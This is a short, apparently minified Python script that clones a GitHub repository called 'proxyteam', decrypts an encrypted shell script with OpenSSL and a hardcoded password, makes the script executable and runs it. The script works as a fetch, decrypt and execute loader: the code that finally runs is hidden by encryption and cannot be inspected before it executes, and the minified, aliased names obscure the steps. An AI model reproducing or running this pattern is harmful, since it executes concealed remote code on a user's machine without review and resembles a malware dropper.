import os
o=True
P=os.chmod
j=os.chdir
x=os.system
import subprocess
y=subprocess.run
x("git clone https://github.com/nppr-team/proxyteam.git")
j('proxyteam')
y(['openssl','enc','-d','-aes-256-cbc','-in','NPPRPROXY.sh.enc','-out','NPPRPROXY.sh','-pass','pass:2517'],check=o)
P('NPPRPROXY.sh',0o755)
y(['./NPPRPROXY.sh'],check=o)
# Created by pyminifier (https://github.com/liftoff/pyminifier)

